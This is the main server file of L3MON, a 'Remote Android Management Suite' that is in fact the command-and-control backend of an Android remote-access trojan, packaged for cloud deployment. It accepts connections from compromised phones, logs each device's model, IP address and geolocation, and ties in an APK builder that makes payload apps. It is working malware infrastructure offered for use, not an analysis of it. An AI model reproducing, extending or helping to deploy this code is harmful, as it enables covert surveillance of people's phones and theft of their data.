/**
 * L3MON - Remote Android Management Suite
 * Main Server Entry Point
 * Updated for Railway deployment with WebSocket support
 * 
 * @author t.me/efxtv
 */

'use strict';

const express = require('express');
const http = require('http');
const app = express();
const IO = require('socket.io');
const geoip = require('geoip-lite');
const CONST = require('./includes/const');
const db = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const ClientManager = require('./includes/clientManager');
const apkBuilder = require('./includes/apkBuilder');

// Initialize client manager
const clientManager = new ClientManager(db);

// Create HTTP server
const server = http.createServer(app);

// Set global variables
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;
global.server = server;

/**
 * Initialize Socket.IO server for client connections
 * Now attached to the same HTTP server for Railway compatibility
 */
function initializeSocketServer() {
    const client_io = IO(server, {
        cors: {
            origin: "*",
            methods: ["GET", "POST"]
        },
        pingInterval: 30000,
        pingTimeout: 60000
    });

    client_io.on('connection', (socket) => {
        socket.emit('welcome');
        
        const clientParams = socket.handshake.query;
        const clientAddress = socket.request.connection;
        const clientIP = extractClientIP(clientAddress.remoteAddress);
        const clientGeo = geoip.lookup(clientIP) || {};

        clientManager.clientConnect(socket, clientParams.id, {
            clientIP,
            clientGeo,
            device: {
                model: clientParams.model,
                manufacture: clientParams.manf,
                version: clientParams.release
            }
        });

        // Debug mode logging
        if (CONST.debug) {
            setupDebugLogging(socket);
        }
    });

    console.log(`[L3MON] Socket.IO server initialized`);
    return client_io;
}

/**
 * Extract client IP from remote address
 */
function extractClientIP(remoteAddress) {
    return remoteAddress.substring(remoteAddress.lastIndexOf(':') + 1);
}

/**
 * Setup debug logging for socket events
 */
function setupDebugLogging(socket) {
    const originalOnevent = socket.onevent;
    socket.onevent = function(packet) {
        const args = packet.data || [];
        originalOnevent.call(this, packet);
        packet.data = ["*"].concat(args);
        originalOnevent.call(this, packet);
    };

    socket.on("*", (event, data) => {
        console.log('[DEBUG] Event:', event);
        console.log('[DEBUG] Data:', data);
    });
}

/**
 * Initialize Express web server
 */
function initializeWebServer() {
    app.set('view engine', 'ejs');
    app.set('views', './assets/views');
    app.use(express.static(__dirname + '/assets/webpublic'));
    app.use(require('./includes/expressRoutes'));

    // Use PORT from environment (Railway provides this) or fallback to web_port
    const PORT = process.env.PORT || CONST.web_port;
    
    server.listen(PORT, '0.0.0.0', () => {
        const url = process.env.RAILWAY_PUBLIC_DOMAIN 
            ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
            : `http://localhost:${PORT}`;
        console.log(`[L3MON] Web interface available at ${url}`);
        console.log(`[L3MON] Server listening on port ${PORT}`);
    });

    server.on('error', (error) => {
        if (error.code === 'EADDRINUSE') {
            console.error(`[ERROR] Port ${PORT} is already in use`);
            process.exit(1);
        }
        throw error;
    });

    return server;
}

/**
 * Display startup banner
 */
function displayBanner() {
    console.log('');
    console.log('╔══════════════════════════════════════════╗');
    console.log('║           L3MON v2.0.0                   ║');
    console.log('║   Remote Android Management Suite        ║');
    console.log('║         Telegram: @efxtv                 ║');
    console.log('╚══════════════════════════════════════════╝');
    console.log('');
}

/**
 * Check Java version on startup
 */
function checkJavaVersion() {
    apkBuilder.getJavaInfo((info) => {
        if (info.installed) {
            console.log(`[L3MON] Java detected: ${info.version}`);
        } else {
            console.warn(`[WARNING] ${info.error}`);
            console.warn('[WARNING] APK building will not be available');
        }
    });
}

/**
 * Handle graceful shutdown
 */
function setupGracefulShutdown() {
    process.on('SIGINT', () => {
        console.log('\n[L3MON] Shutting down gracefully...');
        process.exit(0);
    });

    process.on('SIGTERM', () => {
        console.log('\n[L3MON] Received SIGTERM, shutting down...');
        process.exit(0);
    });

    process.on('uncaughtException', (error) => {
        console.error('[ERROR] Uncaught exception:', error);
        logManager.log(CONST.logTypes.error, `Uncaught exception: ${error.message}`);
    });

    process.on('unhandledRejection', (reason, promise) => {
        console.error('[ERROR] Unhandled rejection at:', promise, 'reason:', reason);
    });
}

/**
 * Main startup function
 */
function main() {
    displayBanner();
    setupGracefulShutdown();
    checkJavaVersion();
    
    try {
        initializeSocketServer();
        initializeWebServer();
        
        logManager.log(CONST.logTypes.success, 'L3MON Server Started Successfully');
        console.log('[L3MON] Server is ready and waiting for connections...');
        console.log('');
    } catch (error) {
        console.error('[ERROR] Failed to start server:', error);
        process.exit(1);
    }
}

// Start the server
main();
